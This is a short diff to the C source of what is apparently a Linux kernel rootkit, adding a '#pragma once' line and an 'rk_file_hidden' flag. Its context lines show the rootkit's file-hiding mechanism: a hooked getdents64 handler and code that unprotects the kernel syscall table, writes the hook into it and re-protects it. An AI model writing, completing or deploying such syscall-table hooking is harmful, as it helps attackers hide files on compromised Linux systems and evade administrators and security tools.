@@ -1,9 +1,11 @@
+#pragma once
 #include "rk_lookup.h"
 #include <linux/dirent.h>
 
 unsigned long rk_sct_address;
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 
+int rk_file_hidden = 0;
 asmlinkage int hook_getdents64(const struct pt_regs *regs) {
   int err;
   struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
@@ -56,6 +58,7 @@ int rk_hide_file_init(void) {
   unprotect(rk_sct_address);
   ((void **)rk_sct_address)[__NR_getdents64] = hook_getdents64;
   protect(rk_sct_address);
+  rk_file_hidden = true;
   return 0;
 }
 
